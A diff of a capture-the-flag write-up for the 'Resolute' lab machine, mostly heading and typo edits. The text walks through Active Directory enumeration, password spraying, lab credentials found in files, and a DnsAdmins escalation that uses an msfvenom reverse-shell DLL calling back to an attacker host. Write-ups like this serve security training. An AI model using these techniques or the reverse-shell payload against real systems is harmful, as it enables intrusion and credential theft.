@@ -4,8 +4,6 @@ layout: default
 
 # Resolute
 
-# Skills
-
 # Enumeration
 
 A basic port scan showed that this is probably a active directory machine.
@@ -46,7 +44,7 @@ SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Stan
 
 We don’t see any reference to a domain controller in the name, but we have a domain name: `megabank.local` . Now we are going to check every service to see what we can get.
 
-## SMB
+### SMB
 
 - Need credentials
 
@@ -68,7 +66,7 @@ do_connect: Connection to 10.10.10.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT
 Unable to connect with SMB1 -- no workgroup available
 ```
 
-## RPC
+### RPC
 
 - We can enumerate the domain using RPC
 
@@ -109,7 +107,7 @@ user:[simon] rid:[0x2777]
 user:[naoki] rid:[0x2778]
 ```
 
-## LDAP
+### LDAP
 
 - We can connect without a user to LDAP
 
@@ -143,6 +141,8 @@ name: megabank
 objectGUID:: RungtOfLt0KPoFxM7C/lqg==
 replUpToDateVector:: AgAAAAAAAAAWAA
 ```
+
+# Foothold
 
 With all this we can try various attacks.
 
@@ -209,8 +209,6 @@ SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\naoki:Wel
 ```
 
 We have credentials `melanie:Welcome123!` .
-
-# Foothold
 
 Actually, melanie is part of the Remote Management Users, so we can connect to the machine.
 
@@ -282,7 +280,7 @@ Global Group memberships     *Domain Users         *Contractors
 The command completed successfully.
 ```
 
-He is the group **Contractors** which is not a common group in active directory. After executing PoweUp.ps1 and winPEAS I have nothing, so let’s do a manual enumeration. Since there is not much to do on the box, let’s try to find files where the name **ryan** is mentioned.
+He is the group **Contractors** which is not a common group in active directory. After executing PowerUp.ps1 and winPEAS I have nothing, so let’s do a manual enumeration. Since there is not much to do on the box, let’s try to find files where the name **ryan** is mentioned.
 
 ```bash
 findstr /SI "passw pwd ryan" *.xml *.ini *.txt *.ps1 *.bat *.config
@@ -299,14 +297,14 @@ So now we have the credentials `ryan:Serv3r4Admin4cc123!` , which actually are v
 
 # Privilege escalation
 
-From the previuos enumeration we could see that there is not much to do in the box, so the path to Administrator from Ryan must come from a new privilege that this user has.
+From the previous enumeration we could see that there is not much to do in the box, so the path to Administrator from Ryan must come from a new privilege that this user has.
 
 If we use bloodhound to enumerate the domain, we will see that the user ryan is part of the **DNSAdmin** group, which means that we may have a possibility to escalate privilege.
 
 - First we create a DLL with a reverse shell as payload
 
 ```bash
-msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll > exploit.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -a x64 > exploit.dll
 ```
 
 - Inject it into the dns.exe process.
